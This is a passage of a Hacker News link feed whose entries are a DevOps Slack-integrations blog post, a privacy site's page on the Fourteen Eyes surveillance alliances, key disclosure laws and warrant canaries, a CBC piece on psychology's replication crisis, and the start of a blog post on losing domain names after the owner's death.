html--><br>
<!--kg-card-end: html--><!--kg-card-begin: image--><figure><img src="https://lh3.googleusercontent.com/XnpvjRt1iYXctHd7CaW37kjYjb4D4QIa7odG70yyBqOBaxbdrHdV6aF4eqI_hzxyaebD7WtFnYOWSxge1iGCho-BK6pbCFP3RySDCYR_ynHGfSvXqJdKtBwL83cJV-ePNbuEV1A"></figure><!--kg-card-end: image--><!--kg-card-begin: html--><br>
<!--kg-card-end: html--><!--kg-card-begin: image--><figure><img src="https://lh6.googleusercontent.com/y8ah1JRLFkMxexXrK9uMy9q8UaRsxjRU4zPW7IEhwUZI_T-XxL3x1i8toFgkzAK9DOhV3EIK2JtnpsHjYnNQ4aI1ED-jH4pP-DaBn2HulFwcAmzUH58HxKSJDemdnuCDjfe1deU"></figure><!--kg-card-end: image--><!--kg-card-begin: html--><br>
<!--kg-card-end: html--><p><a href="https://medium.com/swlh/creating-a-sentiment-bot-in-slack-with-node-js-and-symantos-text-analytics-api-560e854a090d">Symanto</a> built a chatbot with Node.js in Slack using their text analytics API and sentiment models.</p><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="-9-status-aggregation-status-gator">#9 Status Aggregation — Status Gator</h2><p><a href="https://statusgator.com/">Status Gator</a> aggregates almost 700 status pages into Slack and you can query the status of any page on demand.</p><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="-10-devops-monitoring-aws-chatbot">#10 DevOps Monitoring — AWS Chatbot</h2><p><a href="https://docs.aws.amazon.com/chatbot/latest/adminguide/what-is.html?sc_channel=sm&amp;sc_campaign=Docs&amp;sc_publisher=TWITTER&amp;sc_country=Global&amp;sc_geo=GLOBAL&amp;sc_outcome=awareness&amp;trk=Docs_TWITTER&amp;sc_content=Docs&amp;linkId=87843477">AWS Chatbot</a> enables DevOps and software development teams to use Slack chat rooms to monitor and respond to operational events in their AWS Cloud.</p><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="-11-pipeline-notifications-spinnaker">#11 Pipeline Notifications — Spinnaker</h2><p>Configure the <a href="https://blog.opsmx.com/configure-slack-notifications-for-spinnaker-pipelines/">Spinnaker</a> software to receive pipeline notifications through Slack.</p><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="-12-azure-boards-pipelines-repos-microsoft">#12 Azure Boards, Pipelines, Repos — Microsoft</h2><p>Post messages to Slack in response to events in your Azure DevOps organization, such as completed builds, code changes, pull requests, releases, work items changes, and more. <a href="https://docs.microsoft.com/en-us/azure/devops/service-hooks/services/slack?view=azure-devops">Details here</a>.</p><p>There are also <a href="https://zapier.com/apps/azure-devops/integrations/slack">Zapier “zaps” for Azure</a> (and many other <a href="https://zapier.com/apps/categories/developer-tools">dev tools</a>).</p><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="-13-infrastructure-notifications-terraform">#13 Infrastructure Notifications — Terraform</h2><p><a href="https://www.terraform.io/docs/cloud/workspaces/notifications.html">Terraform Cloud</a> can use Slack webhooks to notify external systems about the progress of runs.</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>Don’t forget the preprogrammed apps made just for Slack. Use the <a href="https://ops-community.slack.com/apps/category/At0EFRCDNY-developer-tools">Slack app marketplace</a> to connect your development tools to Slack and raise visibility into builds, errors, or anything else that needs your attention.</p><p>Some Slack apps to call out for DevOps: <a href="https://ops-community.slack.com/apps/A0F7VRE7N-circleci">CircleCI</a>, <a href="https://ops-community.slack.com/apps/A0F81FP4N-travis-ci">Travis CI</a>, <a href="https://gitlab.com/profile/slack/edit">Gitlab</a>, <a href="https://slack.github.com/">Github</a>, <a href="https://cto-ai.slack.com/apps/A0F7VRFKN-jenkins-ci">Jenkins</a>, and <a href="https://www.atlassian.com/software/opsgenie">Atlassian Opsgenie</a>.</p><p><em>Learn more about using Slack for dev teams with their <a href="https://slack.com/resources/why-use-slack/software-development-teams-and-slack">handy handbook</a>.</em></p><p><em>Of course, you also have <a href="https://slack.com/intl/en-ca/features/workflow-automation">Workflow Builder</a> and the <a href="https://slack.dev/">Slack API</a> at your disposal.</em></p><!--kg-card-begin: html--><br><!--kg-card-end: html--><!--kg-card-begin: image--><figure><img src="https://lh5.googleusercontent.com/FTsHIO7yuWQV8WeYinn4_LGFkKSZy8o4lDe-SFgc7PljWTlxAlCqvoc1-Ce4YTwXhl5fDIMhtEqgbnLw4_bH1VGfIPPCCGcsWNWiv3HQT6QefotRGBZY30FwJwPEb4wd0rhdDfk"></figure><!--kg-card-end: image--><!--kg-card-begin: html--><!--kg-card-end: html--><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><p>Now the power of Slack is within you. Take to the channels and reinvent your developer and DevOps workflows with the tools above or in a <a href="https://cto.ai/blog/slack-control-plane-for-devops-workflows/">single control plane within Slack</a>.</p><p>And if you’d like to make your life easier and want to take the CTO.ai Slack-first DevOps workflow platform for a free spin, just <a href="https://w.cto.ai/contact-us">let us know</a>.</p>
			</div><!-- .post-content -->
			<!-- .post-footer -->
		</article></div>]]>
            </description>
            <link>https://cto.ai/blog/slack-hacks-14-ideas-for-developer-devops-workflows-slack-aws-twilio-lyft/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24272333</guid>
            <pubDate>Tue, 25 Aug 2020 15:28:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Global Mass Surveillance – The Fourteen Eyes]]>
            </title>
            <description>
<![CDATA[
Score 316 | Comments 133 (<a href="https://news.ycombinator.com/item?id=24272244">thread link</a>) | @latexr
<br/>
August 25, 2020 | https://www.privacytools.io/providers/#ukusa | <a href="https://web.archive.org/web/*/https://www.privacytools.io/providers/#ukusa">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <nav id="breadcrumb" aria-label="breadcrumb">
  
  <ol itemscope="" itemtype="https://schema.org/BreadcrumbList">
    <li>
      <a href="https://www.privacytools.io/"> <span>Home</span></a>
    </li>
    
    
    <li aria-current="page" itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">
      
      <span itemprop="name">Providers 
      </span>
      <meta itemprop="position" content="1">
    </li>
    
    
  </ol>
</nav>


<div>
  
  <p>There's a ton of people providing services online. Discover which ones you should avoid and our recommendations for a variety of services.</p>
</div>



<p>Click on whatever service you need to view our recommendations.</p>





<img src="https://www.privacytools.io/assets/img/svg/layout/ukusa.svg" width="260" height="115" alt="UKUSA Agreement">

<p>The UKUSA Agreement is an agreement between the United Kingdom, United States, Australia, Canada, and New Zealand to cooperatively collect, analyze, and share intelligence. Members of this group, known as the <a href="https://www.giswatch.org/en/communications-surveillance/unmasking-five-eyes-global-surveillance-practices">Five Eyes</a>, focus on gathering and analyzing intelligence from different parts of the world. While Five Eyes countries have agreed to <a href="https://www.pbs.org/newshour/world/an-exclusive-club-the-five-countries-that-dont-spy-on-each-other">not spy on each other</a> as adversaries, leaks by Snowden have revealed that some Five Eyes members monitor each other's citizens and <a href="https://www.theguardian.com/uk/2013/jun/21/gchq-cables-secret-world-communications-nsa">share intelligence</a> to <a href="https://www.theguardian.com/politics/2013/jun/10/nsa-offers-intelligence-british-counterparts-blunkett">avoid breaking domestic laws</a> that prohibit them from spying on their own citizens. The Five Eyes alliance also cooperates with groups of third-party countries to share intelligence (forming the Nine Eyes and Fourteen Eyes); however, Five Eyes and third-party countries can and do spy on each other.</p>

<div>
  <div>
    <div>
        
        
        <div>
            
  <ol>
    <li>Australia </li>
    <li>Canada </li>
    <li>New Zealand </li>
    <li>United Kingdom </li>
    <li>United States of America </li>
  </ol>
  
        </div>
    </div>
</div>


  <div>
    <div>
        
        
        <div>
            
  <ol>
    <li>Denmark </li>
    <li>France </li>
    <li>Netherlands </li>
    <li>Norway </li>
  </ol>
  
        </div>
    </div>
</div>


  <div>
    <div>
        
        
        <div>
            
  <ol>
    <li>Belgium </li>
    <li>Germany </li>
    <li>Italy </li>
    <li>Spain </li>
    <li>Sweden </li>
  </ol>
  
        </div>
    </div>
</div>

</div>




<h3>Who is required to hand over the encryption keys to authorities?</h3>

<p>Mandatory <a href="https://en.wikipedia.org/wiki/Key_disclosure_law">key disclosure laws</a> require individuals to turn over encryption keys to law enforcement conducting a criminal investigation. How these laws are implemented (who may be legally compelled to assist) vary from nation to nation, but a warrant is generally required. Defenses against key disclosure laws include steganography and encrypting data in a way that provides plausible deniability.</p>  <p><a href="https://en.wikipedia.org/wiki/Steganography">Steganography</a> involves hiding sensitive information (which may be encrypted) inside of ordinary data (for example, encrypting an image file and then hiding it in an audio file). With plausible deniability, data is encrypted in a way that prevents an adversary from being able to prove that the information they are after exists (for example, one password may decrypt benign data and another password, used on the same file, could decrypt sensitive data).</p>



<p> * (people who know how to access a system may be ordered to share their knowledge, <strong>however, this doesn't apply to the suspect itself or family members.</strong>)</p>

<h3>Related Information</h3>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Key_disclosure_law">Wikipedia page on key disclosure law</a></li>
  <li><a href="https://law.stackexchange.com/questions/1523/can-a-us-citizen-be-required-to-provide-the-authentication-key-for-encrypted-dat">law.stackexchange.com question about key disclosure law in US</a></li>
  <li><a href="https://peertube.mastodon.host/videos/watch/e09915eb-5962-4830-a02f-8da5c2b59e71">DEFCON 20: Crypto and the Cops: the Law of Key Disclosure and Forced Decryption</a></li>
</ul>

<h3 id="usa">Why is it not recommended to choose a US-based service?</h3>

<img src="https://www.privacytools.io/assets/img/svg/layout/great_seal_of_the_united_states_obverse.svg" width="200" height="200" alt="USA">

<p>Services based in the United States are not recommended because of the country's surveillance programs and use of <a href="https://www.eff.org/issues/national-security-letters/faq">National Security Letters</a> (NSLs) with accompanying gag orders, which forbid the recipient from talking about the request. This combination allows the government to <a href="https://www.schneier.com/blog/archives/2013/08/more_on_the_nsa.html">secretly force</a> companies to grant complete access to customer data and transform the service into a tool of mass surveillance.</p>

<p>An example of this is <a href="https://en.wikipedia.org/wiki/Lavabit#Suspension_and_gag_order">Lavabit</a> – a secure email service created by Ladar Levison. The FBI <a href="https://www.vice.com/en_us/article/nzz888/lavabit-founder-ladar-levison-discusses-his-federal-battle-for-privacy">requested</a> Snowden's records after finding out that he used the service. Since Lavabit did not keep logs and email content was stored encrypted, the FBI served a subpoena (with a gag order) for the service's SSL keys. Having the SSL keys would allow them to access
communications (both metadata and unencrypted content) in real time for all of Lavabit's customers, not just Snowden's.</p>

<p>Ultimately, Levison turned over the SSL keys and <a href="https://www.theguardian.com/commentisfree/2014/may/20/why-did-lavabit-shut-down-snowden-email">shut down</a> the service at the same time. The US government then <a href="https://www.cnbc.com/id/100962389">threatened Levison with arrest</a>, saying that shutting down the service was a violation of the court order.</p>

<h3>Related Information</h3>

<ul>
  <li><a href="https://www.bestvpn.com/the-ultimate-privacy-guide/#avoidus">Avoid all US and UK based services</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Surespot#History">Proof that warrant canaries work based on the surespot example.</a></li>
  <li><a href="https://en.wikipedia.org/wiki/UKUSA_Agreement">The United Kingdom – United States of America Agreement (UKUSA)</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Lavabit#Suspension_and_gag_order">Lavabit: Suspension and gag order</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Key_disclosure_law">Key disclosure law</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Portal:Mass_surveillance">Wikipedia Portal: Mass_surveillance</a></li>
</ul>




<img src="https://www.privacytools.io/assets/img/svg/layout/warrant_canary_example.svg" width="450px" alt="Warrant Canary Example">

<p>A warrant canary is a posted document stating that an organization has not received any secret subpoenas during a specific period of time. If this document fails to be updated during the specified time then the user is to assume that the service has received such a subpoena and should stop using the service.</p>

<h4>Warrant Canary Examples:</h4>

<ol>
  <li><a href="https://proxy.sh/canary">https://proxy.sh/canary</a></li>
  <li><a href="https://www.ivpn.net/resources/canary.txt">https://www.ivpn.net/resources/canary.txt</a></li>
  <li><a href="https://www.bolehvpn.net/canary.txt">https://www.bolehvpn.net/canary.txt</a></li>
  <li><a href="https://www.ipredator.se/static/downloads/canary.txt">https://www.ipredator.se/static/downloads/canary.txt</a></li>
</ol>

<h4>Related Warrant Canary Information</h4>

<ul>
  <li><a href="https://www.eff.org/deeplinks/2014/04/warrant-canary-faq">Warrant Canary Frequently Asked Questions</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Warrant_canary#Companies_and_organizations_with_warrant_canaries">Companies and organizations with warrant canaries</a></li>
  <li><a href="https://www.schneier.com/blog/archives/2015/03/australia_outla.html">Warrant canary criticism by Bruce Schneier and an example of a law against warrant canaries.</a></li>
</ul>



  </div></div>]]>
            </description>
            <link>https://www.privacytools.io/providers/#ukusa</link>
            <guid isPermaLink="false">hacker-news-small-sites-24272244</guid>
            <pubDate>Tue, 25 Aug 2020 15:20:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Psychologists confront impossible finding, triggering a revolution in the field]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24272198">thread link</a>) | @colinprince
<br/>
August 25, 2020 | https://www.cbc.ca/radio/ideas/psychologists-confront-impossible-finding-triggering-a-revolution-in-the-field-1.5344467 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/radio/ideas/psychologists-confront-impossible-finding-triggering-a-revolution-in-the-field-1.5344467">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>In 2011, American psychologist Daryl Bem proved the impossible. He showed that precognition — the ability to sense the future — is real. His study was explosive, and shook the very foundations of psychology. Contributor Alexander B. Kim in Vancouver explores the ‘replication crisis’ and what it means for the field and beyond.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5344852.1572640305!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/data-analysis.jpg"></p></div><figcaption>Psychology’s ‘replication crisis’ inspired major changes in how researchers conduct their work across the social sciences and beyond.<!-- --> <!-- -->(SolStock/iStock)</figcaption></figure><p><span></span><span>Listen<!-- --> to the full episode</span><span>53:59</span></p><p><span><p><em>*Originally published on November 1, 2019.</em></p>  <p>In 2011, an American psychologist named Daryl Bem proved the impossible. He showed that precognition&nbsp;—&nbsp;the ability to sense the future — is real. His study was explosive, and shook the very foundations of psychology.&nbsp;</p>  <p>"This would probably be the most important research paper I would say ever published in any field, if it were true," said Jeff Galak, psychologist at Carnegie Mellon University.&nbsp;</p>  <p>"If this paper were true, our understanding of the entire world, the universe, physics, [and] psychology, for sure, would be completely different," Galak said.</p>  <p>"We would no longer see time as this linear thing that we move through, but instead something that can go forwards and backwards. And we could reach into the future and pull information from that — if it were true. And 'if 'is a big part of that statement."&nbsp;&nbsp;</p>  <h2>Replication crisis</h2>  <p>Daryl Bem is a professor emeritus of psychology at Cornell University. His paper, <em>Feeling the Future: Experimental Evidence for Anomalous Retroactive Influences on Cognition and Affect,</em>&nbsp;was published in the Journal of Personality and Social Psychology&nbsp;—&nbsp;a top-tier journal for the field.</p>  <p>"The [paper's] conclusion was ridiculous," said Chris Chambers, a professor of cognitive neuroscience at Cardiff University in Wales. He's the author of the book<em> The Seven Deadly Sins of Psychology.&nbsp;</em></p>  <p>"And this is really interesting because if a paper like this that's doing everything normally and properly can end up producing a ridiculous conclusion, then how many other papers that use those exact same methods that didn't reach ridiculous conclusions are similarly flawed?"</p>    <blockquote><span><span><svg version="1.1" focusable="false" x="0px" y="0px" width="30px" height="25px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g><g><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g display="none"><g display="inline"> <path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg>You have a right to scrutinize and verify and correct.​​​​<svg focusable="false" x="0px" y="0px" width="23px" height="22px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g display="none"><g display="inline"><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g><g><path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg></span><cite>- Simine Vazire, psychologist&nbsp;</cite></span></blockquote>    <p>After <em>Feeling the Future</em>&nbsp;was published, a group called the Open Science Collaboration organized a massive replication study. And 270 scientists from 17 countries signed up. They picked 100 studies published in the year 2008 as their test sample — all from reputable, peer-reviewed psychology journals.&nbsp;</p>  <p>The plan was to repeat all 100 experiments exactly as described, and then see what happens. The findings came out in 2015. The results were stunning: only 36 percent of replications were successful.</p>  <h2>The ripple effect</h2>  <p>University of Toronto psychologist Michael Inzlicht was shocked to find that research papers in his own area of research no longer held water. They could not be replicated under the filter of more rigorous methodology.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5344903.1572637528!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/michael-inzlicht.jpeg 300w,https://i.cbc.ca/1.5344903.1572637528!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/michael-inzlicht.jpeg 460w,https://i.cbc.ca/1.5344903.1572637528!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/michael-inzlicht.jpeg 620w,https://i.cbc.ca/1.5344903.1572637528!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/michael-inzlicht.jpeg 780w,https://i.cbc.ca/1.5344903.1572637528!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/michael-inzlicht.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5344903.1572637528!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/michael-inzlicht.jpeg"></p></div><figcaption>Michael Inzlicht is the principal investigator at the Toronto Laboratory for Social Neuroscience.<!-- --> <!-- -->(Submitted by Michael Inzlicht )</figcaption></figure></span></p>  <p>"I had grown up a scientist believing in the scientific method and the tools that we used, and all of a sudden, this one replication just made me question everything," said Inzlicht.&nbsp;</p>  <p>"What was real, what could I trust? The things I was studying... were they real? Could I trust them?"</p>  <p>Inzlicht is one of the psychologists leading the way to set new research standards. He attributes the lapse in his field to the tremendous pressure researchers face to produce new, high-impact research.</p>  <p>"Basic science is not always about chasing the new," said Inzlicht.&nbsp;</p>  <p>"It's not always about chasing something groundbreaking. It's about building a house. And if the foundations of the house are rotten, if from the beginning a discipline was built on shoddy foundations, the entire enterprise can fall."</p>  <h2>Building a new foundation</h2>  <p>Since 2011, standards for psychology research have indeed changed.&nbsp;</p>  <p>What's known as 'pre-registration' is becoming more common: researchers writing up how they're going to conduct a study, what their hypotheses are, and how they intend to analyze the data before doing their experiment. This protocol prevents researchers from massaging the data and reporting a positive result until they actually find one.</p>  <p>More than 200 scientific journals, both inside and outside psychology, now publish "registered reports," reporting their decision whether to accept or reject studies that are submitted before the experiments have actually been performed. So the decision is based on the proposed methodology and not how exciting the results are.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5344999.1572636662!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/alexander-b-kim.JPG 300w,https://i.cbc.ca/1.5344999.1572636662!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/alexander-b-kim.JPG 460w,https://i.cbc.ca/1.5344999.1572636662!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/alexander-b-kim.JPG 620w,https://i.cbc.ca/1.5344999.1572636662!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/alexander-b-kim.JPG 780w,https://i.cbc.ca/1.5344999.1572636662!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/alexander-b-kim.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5344999.1572636662!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/alexander-b-kim.JPG"></p></div><figcaption>Alexander Kim is a journalist and radio producer based in Vancouver.<!-- --> <!-- -->(Submitted by Alexander B. Kim)</figcaption></figure></span></p>  <p>Researchers also formed formed organizations like the Centre for Open Science and the <a href="https://improvingpsych.org/" target="_blank">Society for the Improvement of Psychological Science</a>.</p>  <p>"If you're signing up to be a scientist, you're signing up to say 'check my work'," said Simine Vazire,&nbsp;psychologist at the University of California at Davis and one of the co-founders of the Society for the Improvement of Psychological Science.&nbsp;</p>  <p>"Don't just take my word for it. Don't just trust me," said Vazire.&nbsp; "You have a right to scrutinize and verify and correct."<br> &nbsp;</p>  <p><strong>Guests in this episode:</strong></p>  <ul>   <li><strong><a href="http://www.jeffgalak.com/" target="_blank">Jeff Galak</a></strong>&nbsp;is a&nbsp;professor of marketing at Carnegie Mellon University.&nbsp;</li>   <li><strong><a href="https://psychology.cornell.edu/daryl-bem" target="_blank">Daryl Bem</a>&nbsp;</strong>is professor emeritus of psychology at Cornell University.&nbsp;</li>   <li><strong><a href="https://www.cardiff.ac.uk/people/view/133632-chambers-chris" target="_blank">Chris Chambers</a>&nbsp;</strong>is a professor of psychology specializing in cognitive neuroscience at Cardiff University in Wales. He's also the author of the book,<em> The Seven Deadly Sins of Psychology</em>.</li>   <li><strong><a href="http://http//michaelinzlicht.com/#lab-view" target="_blank">Michael Inzlicht</a></strong>&nbsp;is a professor of psychology at the University of Toronto. He's also a principal investigator at the Toronto Laboratory for Social Neuroscience.</li>   <li><strong><a href="http://https//www.simine.com/" target="_blank">Simine Vazire</a></strong>&nbsp;is an&nbsp;associate professor of psychology at U.C. Davis where she studies personality. She is one of the co-founders of the <a href="https://improvingpsych.org/&amp;nbsp;" target="_blank">Society for the Improvement of Psychological Science</a>.</li>   <li><strong><a href="https://www.cardiff.ac.uk/people/view/38108-collins-harry" target="_blank">Harry Collins</a></strong>&nbsp;is a&nbsp;distinguished research professor of social science at Cardiff University, specializing in scientific knowledge. He's the author of <a href="http://sites.cardiff.ac.uk/harrycollins/main-books/" target="_blank">several books</a> including <em>Forms of Life: The method and meaning of sociology.</em></li>   <li><strong><a href="http://https//atullett.people.ua.edu/" target="_blank">Alexa Tullet </a></strong>is an&nbsp;assistant professor of social psychology at the University of Alabama and co-founder of the Society for the Improvement of Psychological Science.</li>   <li><strong><a href="https://psychology.ucdavis.edu/people/aml" target="_blank">Alison Ledgerwood </a></strong>is a professor of psychology at U.C. Davis.<p>  <em>Special thanks to Dr. Ed Kroc, for help with statistics; Dr. Candis Callison, for help with philosophy of science; Tom Lowe, for recording Professor Collins in Wales; Emma Partridge, for booking Professor Bem; and Cited Media Productions, for supporting the making of this programme.</em></p></li>  </ul>  <hr>  <p><br> <em>** This episode was written and produced by<a href="https://alexanderbkim.wordpress.com/" target="_blank"> Alexander B. Kim</a> of <a href="https://citedpodcast.com/&amp;nbsp;" target="_blank">Cited Podast</a>,&nbsp;with support from Ideas Senior Producer&nbsp;Nicola&nbsp;Luksic.</em></p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/radio/ideas/psychologists-confront-impossible-finding-triggering-a-revolution-in-the-field-1.5344467</link>
            <guid isPermaLink="false">hacker-news-small-sites-24272198</guid>
            <pubDate>Tue, 25 Aug 2020 15:15:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rip.com: Here's What Happens to Your Domains When You Die]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24272178">thread link</a>) | @KaiserSanchez
<br/>
August 25, 2020 | https://www.kubera.com/blog/what-happens-to-your-domains-when-you-die | <a href="https://web.archive.org/web/*/https://www.kubera.com/blog/what-happens-to-your-domains-when-you-die">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Even experienced domainers may not know the name Igal Lichtman. The legendary domain investor was better known by his business name, Mrs Jello.<br></p><p>Over a career spanning decades, Lichtman acquired a vast portfolio of investment domains, many worth tens of thousands of dollars. But it was what happened after Lichtman passed away in 2013 that should serve as a cautionary tale to <em>all</em> domainers.</p><h2>What Happens to Your Domains When You Die?<br></h2><p>What happens to your domains <a href="https://www.kubera.com/blog/what-important-financial-information-should-my-family-know">when you die</a> depends on how you prepare for the inevitable.</p><p>In Lichtman’s case, there wasn’t nearly enough preparation, if any. When Lichtman died from cancer complications in February of 2013, his family was left with the difficult task of trying to organize and gain access to his vast portfolio of investment domains.<br></p><p>But as his family learned, Lichtman hadn’t created a clear path for his beneficiaries to take ownership of his domains. As they expired, they were <a href="https://www.thedomains.com/2013/02/22/after-75k-in-lost-domains-igal-in-death-teaches-us-we-need-an-after-life-plan/" target="_blank">auctioned off by their registrars</a>.&nbsp;<br></p><p>The same month that Lichtman died, Vodka.net sold for $20,000. Penis.net was auctioned for $5,015. And in one of the biggest sales from Lichtman’s portfolio, Vegans.com sold for $48,000.<br></p><p>This is all money that could have gone to Lichtman’s beneficiaries. They could have kept those domains as investments, or sold them for an immediate payout for Lichtman’s family. Instead, those big payouts went to the domain registrars and auction companies that facilitated the sales.<br></p><h2>What Happened To Igal Lichtman Could Happen To Anyone<br></h2><p>Igal Lichtman made a career out of investing in domains, so his death (and the subsequent loss of his entire portfolio) made waves in the domainer world.<br></p><p>But this isn’t something that only happens to professional domain investors.<br></p><p>Jane Both, a lifelong entrepreneur from Milford, Pennsylvania, was just 50 years old when she <a href="https://www.recordonline.com/article/20170331/obituaries/303319989" target="_blank">died suddenly</a> while walking her dogs in her neighborhood in late March of 2017. Both was involved in all kinds of business ventures, including Streamline Management of Port Jervis, a home inspection service. But she was also savvy when it came to domain investing. In 2013, long before many people were considering the potential of blockchain domains, Both was buying as many as she could find.<br></p><p>Her portfolio eventually consisted of more than 100 domains containing the “blockchain” keyword — including appealing domains like BlockchainManagement.com, BlockchainAssets.com, BlockchainFinance.com, BlockchainPro.com, and BlockchainTools.com.<br></p><p>But you can probably guess where this story is going. Like Lichtman, Both didn’t plan for what would happen to her domains after her death. And so, in 2018, they <a href="https://www.thedomains.com/2018/01/18/100-expiring-blockchain-domain-auctions-next-5-days/" target="_blank">began to expire and head to auction.</a><br></p><figure id="w-node-eb256527c8e9-ac468d02"><p><img src="https://uploads-ssl.webflow.com/5ded36b5e942e74b13468d23/5f32b6a8e3394406d2d74bf9_01-Image%402x.png" alt="what happens to your domains when you die"></p></figure><p>Of the more than 100 blockchain domains Both owned, many sold for thousands of dollars, and many more for hundreds. In all, her beneficiaries missed out on tens of thousands of dollars that resulted from the sale of all of Both’s domains — money that should have gone to her loved ones, but instead went to registrars and auction companies.<br></p><h2>It’s Time to Treat Domains Like Any Other Wealth Asset<br></h2><p>These stories make one thing clear: Whether you purchase domains for the express purpose of investing in them, or just own the domains for your business or personal websites, domains can be valuable and sentimental, and they should be treated like any other digital wealth asset. In the digital age, anyone who owns a domain needs a plan in place for someone to take ownership of and manage it after their death.<br></p><p>Most domain registrars have a process in place for when an account owner dies. For example, GoDaddy, one of the world’s largest domain registrars, <a href="https://www.godaddy.com/help/how-to-gain-access-to-domainsaccounts-after-owners-death-8356" target="_blank">outlines steps</a> for what to do and how to gain access to domains or accounts after their owner’s death.<br></p><p>But even when a registrar has a process in place, it can be complicated for beneficiaries who aren’t well versed in domains and digital assets. And then there’s the question of whether your beneficiaries will even <em>know</em> what domains you own, whether they have value, and how to seek access to them.<br></p><p>You can’t leave this process to chance, or just assume that your beneficiaries will know to follow your registrar’s steps to take control of your domains. You have to be proactive to protect your domain investments.<br></p><h2>How to Protect Your Domain Investments: Step By Step<br></h2><p>Ready to make sure your domains are protected in case of the worst? Here’s what you need to do.<br></p><h3>Create a Digital Inventory<br></h3><p>We rarely think about how many online accounts we create all the time. From social media, to streaming sites and Spotify, ecommerce sites, food delivery, and, of course, our domains — there are <em>tons</em> of sites that have our 